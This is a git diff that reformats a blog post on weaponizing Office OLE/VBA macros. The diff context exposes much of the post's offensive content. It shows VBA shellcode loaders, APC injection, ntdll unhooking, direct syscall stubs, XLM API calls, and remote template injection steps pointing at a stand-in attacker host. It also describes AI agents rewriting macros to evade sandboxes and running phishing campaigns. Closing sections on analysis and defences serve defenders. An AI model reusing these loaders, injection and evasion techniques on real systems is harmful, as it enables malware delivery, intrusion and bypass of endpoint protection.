@@ -18,7 +18,6 @@ readTime: "27 min"
 url: "https://asbawy.github.io/logs/weaponizing-ole-vba-macros"
 ---
 
-
 ![Banner](https://i.imgur.com/Bgs0aTj.png)
 
 ## Introduction: Why Legacy Still Dominates
@@ -62,7 +61,7 @@ The form itself can be configured with `ShowModal = False` and zero dimensions, 
 
 **Class Module Event Hooking (Application-Level Capture)**
 
-Advanced operators instantiate a custom class module to hook `Application`-level events, specifically capturing events that occur *after* the document is already open and the user is interacting. This moves execution away from the high-fidelity document-open telemetry.
+Advanced operators instantiate a custom class module to hook `Application`-level events, specifically capturing events that occur _after_ the document is already open and the user is interacting. This moves execution away from the high-fidelity document-open telemetry.
 
 ```vba
 ' Class Module: CAppEvents
@@ -113,9 +112,9 @@ Extract the benign `.docx`, navigate to `word/_rels/settings.xml.rels`, and inje
 ```xml
 <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
 <<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
-  <Relationship Id="rId1" 
-                Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" 
-                Target="https://attacker.example.com/templates/Financial_Q2.dotm" 
+  <Relationship Id="rId1"
+                Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate"
+                Target="https://attacker.example.com/templates/Financial_Q2.dotm"
                 TargetMode="External"/>
 </Relationships>
 ```
@@ -123,6 +122,7 @@ Extract the benign `.docx`, navigate to `word/_rels/settings.xml.rels`, and inje
 Repackage the ZIP archive. The `.docx` remains macro-free and passes attachment scanning. When the victim opens it, Word resolves the external relationship, downloads the `.dotm` over HTTPS, and executes any `AutoOpen` or `Document_Open` macros within the template context. The template is cached locally, so subsequent opens execute even without network connectivity.
 
 **Operational Notes:**
+
 - The remote server should serve the `.dotm` with a `Content-Type: application/vnd.openxmlformats-officedocument.wordprocessingml.template` header to ensure proper handling.
 - Operators often use legitimate-looking domains and paths (`/templates/corporate/2026_Q2_Review.dotm`) to blend into normal Office behavior.
 - Because the malicious code lives in the remote template, the initial `.docx` hash will never match known-bad signature databases.
@@ -153,7 +153,6 @@ AI generates contextually appropriate dead code—realistic financial calculatio
 #### Hidden Text & Metadata Channels
 
 Payload segments are stored in document variables, custom XML parts, hidden spreadsheet rows/columns, or formatted as white-on-white text. Some operators abuse the `Comments` collection or `DocumentProperties` to store encrypted stage-two URLs.
-
 
 #### Excel 4.0 (XLM) Macro Weaponization
 
@@ -203,12 +202,12 @@ The following pattern allocates executable memory in the current process, copies
         ByVal dwSize As LongLong, _
         ByVal flAllocationType As Long, _
         ByVal flProtect As Long) As LongPtr
-    
+
     Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" ( _
         ByVal Destination As LongPtr, _
         ByRef Source As Any, _
         ByVal Length As LongLong) As LongPtr
-    
+
     Private Declare PtrSafe Function CreateThread Lib "kernel32" ( _
         ByVal lpThreadAttributes As LongPtr, _
         ByVal dwStackSize As LongLong, _
@@ -226,12 +225,12 @@ Sub ExecuteShellcode()
     Dim buf() As Byte
     Dim addr As LongPtr
     Dim hThread As LongPtr
-    
+
     buf = DecodeShellcodeFromDocumentVariable()
-    
+
     addr = VirtualAlloc(0, UBound(buf) + 1, MEM_COMMIT Or MEM_RESERVE, PAGE_EXECUTE_READWRITE)
     If addr = 0 Then Exit Sub
-    
+
     RtlMoveMemory addr, buf(0), UBound(buf) + 1
     hThread = CreateThread(0, 0, addr, 0, 0, 0)
 End Sub
@@ -249,7 +248,7 @@ For even lower telemetry, operators target existing threads in the Office proces
         ByVal pfnAPC As LongPtr, _
         ByVal hThread As LongPtr, _
         ByVal dwData As LongPtr) As Long
-    
+
     Private Declare PtrSafe Function OpenThread Lib "kernel32" ( _
         ByVal dwDesiredAccess As Long, _
         ByVal bInheritHandle As Long, _
@@ -261,12 +260,12 @@ Sub APCInject()
     Dim addr As LongPtr
     Dim hThread As LongPtr
     Dim tid As Long
-    
+
     tid = GetTargetThreadId()
     buf = DecodeShellcode()
     addr = VirtualAlloc(0, UBound(buf) + 1, MEM_COMMIT Or MEM_RESERVE, PAGE_EXECUTE_READWRITE)
     RtlMoveMemory addr, buf(0), UBound(buf) + 1
-    
+
     hThread = OpenThread(&H20, 0, tid) ' THREAD_SET_CONTEXT
     QueueUserAPC addr, hThread, 0
 End Sub
@@ -288,11 +287,11 @@ The operator reads a pristine copy of `ntdll.dll` from disk (`C:\Windows\System3
 #If VBA7 Then
     Private Declare PtrSafe Function GetModuleHandleA Lib "kernel32" ( _
         ByVal lpModuleName As String) As LongPtr
-    
+
     Private Declare PtrSafe Function GetProcAddress Lib "kernel32" ( _
         ByVal hModule As LongPtr, _
         ByVal lpProcName As String) As LongPtr
-    
+
     Private Declare PtrSafe Function CreateFileA Lib "kernel32" ( _
         ByVal lpFileName As String, _
         ByVal dwDesiredAccess As Long, _
@@ -301,14 +300,14 @@ The operator reads a pristine copy of `ntdll.dll` from disk (`C:\Windows\System3
         ByVal dwCreationDisposition As Long, _
         ByVal dwFlagsAndAttributes As Long, _
         ByVal hTemplateFile As LongPtr) As LongPtr
-    
+
     Private Declare PtrSafe Function ReadFile Lib "kernel32" ( _
         ByVal hFile As LongPtr, _
         ByRef lpBuffer As Byte, _
         ByVal nNumberOfBytesToRead As Long, _
         ByRef lpNumberOfBytesRead As Long, _
         ByVal lpOverlapped As LongPtr) As Long
-    
+
     Private Declare PtrSafe Function CloseHandle Lib "kernel32" ( _
         ByVal hObject As LongPtr) As Long
 #End If
@@ -322,16 +321,16 @@ Sub UnhookNTDLL()
     Dim hFile As LongPtr
     Dim bytesRead As Long
     Dim cleanNtdll() As Byte
-    
+
     hNtdll = GetModuleHandleA("ntdll.dll")
-    
+
     hFile = CreateFileA("C:\Windows\System32\ntdll.dll", GENERIC_READ, _
                         FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0)
-    
+
     ReDim cleanNtdll(0 To 1703935) ' ~1.6MB, adjust per build
     ReadFile hFile, cleanNtdll(0), UBound(cleanNtdll) + 1, bytesRead, 0
     CloseHandle hFile
-    
+
     ' Walk PE export directory of the disk copy, find each target function,
     ' then overwrite the hooked stub in the loaded image with clean bytes.
     ' RtlMoveMemory hookedAddress, cleanAddress, stubLength
@@ -351,7 +350,7 @@ Rather than restoring hooks, operators can bypass userland entirely by construct
         ByVal dwSize As LongLong, _
         ByVal flAllocationType As Long, _
         ByVal flProtect As Long) As LongPtr
-    
+
     Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" ( _
         ByVal Destination As LongPtr, _
         ByRef Source As Any, _
@@ -361,7 +360,7 @@ Rather than restoring hooks, operators can bypass userland entirely by construct
 Sub DirectSyscallExec()
     Dim syscallStub(0 To 23) As Byte
     Dim stubAddr As LongPtr
-    
+
     ' NtAllocateVirtualMemory stub (Win10 22H2 x64, SSN 0x18)
     ' mov r10, rcx / mov eax, 18h / syscall / ret
     syscallStub(0) = &H4C: syscallStub(1) = &H8B: syscallStub(2) = &HD1
@@ -369,10 +368,10 @@ Sub DirectSyscallExec()
     syscallStub(6) = &H0:  syscallStub(7) = &H0
     syscallStub(8) = &HF:  syscallStub(9) = &H5
     syscallStub(10) = &HC3
-    
+
     stubAddr = VirtualAlloc(0, 24, MEM_COMMIT Or MEM_RESERVE, PAGE_EXECUTE_READWRITE)
     RtlMoveMemory stubAddr, syscallStub(0), 24
-    
+
     ' Invoke via CallWindowProc indirection or typelib function pointer.
     ' Enters kernel mode directly, never touches hooked ntdll stubs.
 End Sub
@@ -392,10 +391,10 @@ Static heuristic engines parse VBA modules for `Declare` statements and flag kno
 Sub DynamicExec()
     Dim wsh As Object
     Set wsh = CreateObject("WScript.Shell")
-    
+
     Dim method As String
     method = Chr(82) & Chr(117) & Chr(110) ' "Run" built at runtime
-    
+
     CallByName wsh, method, VbMethod, "notepad.exe", 0, True
 End Sub
 ```
@@ -412,7 +411,7 @@ End Function
 Sub HashedInvoke()
     Dim hKernel As LongPtr
     hKernel = GetModuleHandleA("kernel32.dll")
-    
+
     Dim pVirtualAlloc As LongPtr
     pVirtualAlloc = GetProcByHash(hKernel, &HEF73C874) ' ROR13 hash of VirtualAlloc
 End Sub
@@ -442,10 +441,10 @@ End Sub
 Sub SilentDLLInvoke()
     Dim registerCmd As String
     Dim callCmd As String
-    
+
     registerCmd = "REGISTER(""kernel32.dll"",""VirtualAlloc"",""JJJJJ"",""MyAlloc"",""JJJJJ"",1)"
     Application.ExecuteExcel4Macro registerCmd
-    
+
     callCmd = "CALL(MyAlloc,0,1024,12288,64)" ' MEM_COMMIT|RESERVE, RWX
     Dim result As Variant
     result = Application.ExecuteExcel4Macro(callCmd)
@@ -465,17 +464,17 @@ Generative AI has not merely accelerated existing techniques; it has introduced 
 
 AI-generated polymorphism transcends simple variable renaming. The model preserves semantic equivalence while completely restructuring control flow:
 
-* **Semantic-Preserving Rewriting:** The core instruction ("download and execute") is expressed through randomized VBA patterns—recursive functions, state machines, exception-based control flow, or Office object model indirection.
-* **Contextual Dead Code:** Rather than random mathematical operations, AI generates business-logic-appropriate code. A financial document receives synthetic amortization calculations; an HR document receives benefits computation routines. This defeats semantic outlier detection.
-* **Iterative Evasion Loops:** Autonomous agents generate a macro, submit it to VirusTotal or a local sandbox, parse the detection report, and prompt themselves to rewrite the code to eliminate specific signatures. Q1 2026 red team exercises achieved **zero-detection windows of 72+ hours** on public sandboxes using this loop.
+- **Semantic-Preserving Rewriting:** The core instruction ("download and execute") is expressed through randomized VBA patterns—recursive functions, state machines, exception-based control flow, or Office object model indirection.
+- **Contextual Dead Code:** Rather than random mathematical operations, AI generates business-logic-appropriate code. A financial document receives synthetic amortization calculations; an HR document receives benefits computation routines. This defeats semantic outlier detection.
+- **Iterative Evasion Loops:** Autonomous agents generate a macro, submit it to VirusTotal or a local sandbox, parse the detection report, and prompt themselves to rewrite the code to eliminate specific signatures. Q1 2026 red team exercises achieved **zero-detection windows of 72+ hours** on public sandboxes using this loop.
 
 ### Chatbot & Automated Delivery Pipelines
 
 Phishing-as-a-Service platforms now integrate LLM agents for end-to-end campaign automation:
 
-* **OSINT Synthesis:** Agents scrape LinkedIn, corporate filings, and news releases to construct highly contextual pretexts.
-* **Conversational Social Engineering:** If a target responds with skepticism, the agent engages in multi-turn email conversations, adapting tone and content in real time.
-* **Document Customization:** The same OSINT data seeds document generation—correct logos, formatting, metadata, and even document properties like `Author` and `Company` match the target's standard templates.
+- **OSINT Synthesis:** Agents scrape LinkedIn, corporate filings, and news releases to construct highly contextual pretexts.
+- **Conversational Social Engineering:** If a target responds with skepticism, the agent engages in multi-turn email conversations, adapting tone and content in real time.
+- **Document Customization:** The same OSINT data seeds document generation—correct logos, formatting, metadata, and even document properties like `Author` and `Company` match the target's standard templates.
 
 ### The Critical Escalation: CVE-2026-21509
 
@@ -533,12 +532,12 @@ Construct the RTF with an embedded OLE object that exploits the parsing vulnerab
 {\rtf1\ansi\deff0
 {\object\objautlink\objupdate
 {\*\objclass Package}
-{\*\objdata 
+{\*\objdata
 01050000
 02000000
 ... [hex-encoded OLE package containing the exploit trigger] ...
 }
-{\result{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid12345 
+{\result{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid12345
 Click here to view document
 }}
 }
@@ -604,6 +603,7 @@ $ oledump.py suspicious_invoice.doc
 ```
 
 **Key observations:**
+
 - Streams 5 and 6 (`M`) contain VBA source.
 - Stream 2 (`Equation Native`) is a high-confidence indicator of CVE-2017-11882 or similar Equation Editor exploits.
 - Stream 7 (`_VBA_PROJECT`) contains the compiled P-Code. If `olevba` output looks benign but P-Code streams are anomalous, suspect **VBA Stomping**.
@@ -685,6 +685,7 @@ Raw `olevba` output is fed to a security-tuned LLM agent that identifies TTPs an
 ### Auto-Generated Detection Rules
 
 The same pipeline produces:
+
 - **YARA signatures** targeting specific obfuscation patterns (e.g., `Chr()` chains exceeding 50 elements, `VirtualAlloc` declarations in VBA, `ExecuteExcel4Macro` with `EXEC` strings).
 - **Sigma rules** mapping behavioral indicators: `PowerShell` with `-WindowStyle Hidden` downloading from non-routable IPs, or `winword.exe` allocating `PAGE_EXECUTE_READWRITE` memory.
 
@@ -704,22 +705,22 @@ The convergence of legacy file formats and generative AI has created a detection
 
 Static signatures are useless against AI-driven polymorphism. Defenders must instrument runtime behavior:
 
-* **Child Process Monitoring:** Alert on `winword.exe` or `excel.exe` spawning `powershell.exe`, `cmd.exe`, or `wscript.exe`. But recognize that API-based injection, XLM `EXEC`, and `ExecuteExcel4Macro` produce **zero child processes**—behavioral monitoring must also inspect in-memory thread creation, `VirtualAlloc` with `PAGE_EXECUTE_READWRITE`, and `NtProtectVirtualMemory` syscalls.
-* **AMSI Integration:** The Antimalware Scan Interface scans scripts at invocation time, after deobfuscation. Ensure AMSI is enabled for Office VBA and PowerShell. It will catch `IEX`, `DownloadString`, and encoded commands even when obfuscated. Note that XLM macros and direct syscalls may bypass AMSI entirely.
-* **ETW Telemetry:** Enable Event Tracing for Windows providers for `Microsoft-Windows-Kernel-Process`, `Microsoft-Windows-PowerShell`, and `Microsoft-Office-Common`. Look for anomalous API call sequences within Office processes, including `ntdll` unhooking patterns (suspicious writes to `ntdll` `.text` sections) and in-memory syscall stub execution.
+- **Child Process Monitoring:** Alert on `winword.exe` or `excel.exe` spawning `powershell.exe`, `cmd.exe`, or `wscript.exe`. But recognize that API-based injection, XLM `EXEC`, and `ExecuteExcel4Macro` produce **zero child processes**—behavioral monitoring must also inspect in-memory thread creation, `VirtualAlloc` with `PAGE_EXECUTE_READWRITE`, and `NtProtectVirtualMemory` syscalls.
+- **AMSI Integration:** The Antimalware Scan Interface scans scripts at invocation time, after deobfuscation. Ensure AMSI is enabled for Office VBA and PowerShell. It will catch `IEX`, `DownloadString`, and encoded commands even when obfuscated. Note that XLM macros and direct syscalls may bypass AMSI entirely.
+- **ETW Telemetry:** Enable Event Tracing for Windows providers for `Microsoft-Windows-Kernel-Process`, `Microsoft-Windows-PowerShell`, and `Microsoft-Office-Common`. Look for anomalous API call sequences within Office processes, including `ntdll` unhooking patterns (suspicious writes to `ntdll` `.text` sections) and in-memory syscall stub execution.
 
 ### 2. Secure Your Own AI Tools
 
-* **Prompt Filtering:** Block commercial AI prompts requesting VBA code, PowerShell obfuscation, XLM macro generation, or exploit development.
-* **Air-Gapped Analysis:** Security teams must operate localized, offline LLMs for malware analysis. Never submit sensitive or potentially malicious code to public AI APIs—this risks data exfiltration and contributes to adversarial training.
+- **Prompt Filtering:** Block commercial AI prompts requesting VBA code, PowerShell obfuscation, XLM macro generation, or exploit development.
+- **Air-Gapped Analysis:** Security teams must operate localized, offline LLMs for malware analysis. Never submit sensitive or potentially malicious code to public AI APIs—this risks data exfiltration and contributes to adversarial training.
 
 ### 3. Shrink the Attack Surface
 
-* **Block Legacy Formats:** Configure email gateways to block or sandbox `.doc`, `.xls`, `.ppt`, `.rtf`, and `.xlsm`. Force conversion to modern formats (`.docx`, `.xlsx`) which do not support macros by default. However, be aware that `.docx` remote template injection bypasses this if not paired with network egress controls.
-* **Mark-of-the-Web Enforcement:** Block macros in files originating from the internet. Require digitally signed macros for any business-critical exception.
-* **OLE Object Inspection:** Scan documents for embedded OLE Package objects. These are rare in legitimate business documents and should be treated as high-risk.
-* **Remote Template Blocking:** Use Group Policy or Office security settings to prevent documents from loading templates from external network locations. Disable `Trusted Locations` that point to network shares.
-* **User Training Evolution:** "Look for suspicious senders" is obsolete when AI writes flawless pretexts. Train employees to verify unexpected documents through out-of-band channels—Teams, Slack, or phone—before opening.
+- **Block Legacy Formats:** Configure email gateways to block or sandbox `.doc`, `.xls`, `.ppt`, `.rtf`, and `.xlsm`. Force conversion to modern formats (`.docx`, `.xlsx`) which do not support macros by default. However, be aware that `.docx` remote template injection bypasses this if not paired with network egress controls.
+- **Mark-of-the-Web Enforcement:** Block macros in files originating from the internet. Require digitally signed macros for any business-critical exception.
+- **OLE Object Inspection:** Scan documents for embedded OLE Package objects. These are rare in legitimate business documents and should be treated as high-risk.
+- **Remote Template Blocking:** Use Group Policy or Office security settings to prevent documents from loading templates from external network locations. Disable `Trusted Locations` that point to network shares.
+- **User Training Evolution:** "Look for suspicious senders" is obsolete when AI writes flawless pretexts. Train employees to verify unexpected documents through out-of-band channels—Teams, Slack, or phone—before opening.
 
 ---
 
@@ -728,4 +729,3 @@ Static signatures are useless against AI-driven polymorphism. Defenders must ins
 The defenders who prevail in 2026 are not those with the most comprehensive signature databases. They are the ones who detect anomalous behavior fastest, maintain minimal attack surface, and understand that AI has become a force multiplier for both offense and defense.
 
 Legacy file formats are not disappearing. They are too deeply embedded in business workflows and too effective as attack vectors to be abandoned. What has changed is the velocity, scale, and sophistication with which these vintage techniques are deployed. The security teams—red or blue—who internalize this reality and adapt their tooling accordingly will define the next era of cybersecurity.
-  
